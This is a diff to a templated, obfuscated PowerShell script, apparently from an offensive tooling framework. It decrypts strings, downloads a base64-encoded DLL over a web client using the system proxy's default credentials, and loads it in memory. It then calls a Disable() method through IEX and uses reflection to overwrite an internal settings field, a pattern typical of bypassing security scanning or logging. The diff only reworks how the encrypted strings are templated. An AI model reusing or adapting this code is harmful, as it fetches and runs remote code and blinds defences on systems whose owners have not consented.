@@ -61,9 +61,11 @@ function Decrypt-String {
     $result
 }
 
-$method = Decrypt-String "{{string0}}"
+{% for s in strings %}
+$string{{loop.index}} = Decrypt-String "{{s}}"
+{% endfor %}
 
-if(-not ([System.Management.Automation.PSTypeName]"$method").Type) {
+if(-not ([System.Management.Automation.PSTypeName]"$string0").Type) {
     $K=new-object net.webclient
     $K.proxy=[Net.WebRequest]::GetSystemWebProxy()
     $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
@@ -74,13 +76,7 @@ if(-not ([System.Management.Automation.PSTypeName]"$method").Type) {
     [Reflection.Assembly]::Load([Convert]::FromBase64String($DLL)) | Out-Null
 }
 
-IEX "[$method]::Disable()"
-
-$string1 = Decrypt-String "{{string1}}"
-$string2 = Decrypt-String "{{string2}}"
-$string3 = Decrypt-String "{{string3}}"
-$string4 = Decrypt-String "{{string4}}"
-$string5 = Decrypt-String "{{string5}}"
+IEX "[$string0]::Disable()"
 
 $settings = [Ref].Assembly.GetType($string1).GetField($string2,$string3).GetValue($null);
 $settings[$string4] = @{}
